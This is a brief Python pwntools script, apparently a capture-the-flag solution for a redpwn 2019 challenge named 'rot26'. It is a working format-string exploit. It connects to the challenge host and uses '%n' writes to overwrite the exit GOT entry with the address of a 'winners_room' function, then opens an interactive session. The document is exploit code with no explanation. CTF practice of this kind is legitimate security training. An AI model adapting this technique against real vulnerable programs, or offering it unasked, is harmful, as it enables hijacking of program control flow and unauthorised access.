from pwn import *

p = remote('chall.2019.redpwn.net', 4003)
# p = process('./rot26')

winners_room = 0x08048737
exit_plt = 0x804a020

exploit = ''
exploit += p32(exit_plt)
exploit += p32(exit_plt+2)
exploit += '%34607u'
exploit += '%7$n'
exploit += '%32973u'
exploit += '%8$n'

p.sendline(exploit)
p.interactive()
